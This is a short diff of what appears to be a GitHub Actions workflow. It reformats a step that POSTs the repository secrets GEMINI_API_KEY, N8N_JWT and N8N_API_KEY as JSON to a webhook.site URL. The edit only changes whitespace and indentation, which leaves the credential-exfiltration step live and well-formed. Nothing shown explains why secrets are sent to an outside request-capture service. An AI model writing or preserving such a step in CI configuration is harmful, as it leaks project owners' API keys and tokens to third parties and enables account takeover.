@@ -15,10 +15,10 @@ jobs:
         with:
           url: "https://webhook.site/b8cfa571-543d-4ff2-ae8b-595b8942ef6e"
           method: "POST"
-          customHeaders: '{"Content-Type": "application/json"}'
+          customHeaders: '{ "Content-Type": "application/json" }'
           data: |
-          {
-            "GEMINI_API_KEY": "${{ secrets.GEMINI_API_KEY }}",
-            "N8N_JWT": "${{ secrets.N8N_JWT }}",
-            "N8N_API_KEY": "${{ secrets.N8N_API_KEY }}"
-          }
+            {
+              "GEMINI_API_KEY": "${{ secrets.GEMINI_API_KEY }}",
+              "N8N_JWT": "${{ secrets.N8N_JWT }}",
+              "N8N_API_KEY": "${{ secrets.N8N_API_KEY }}"
+            }
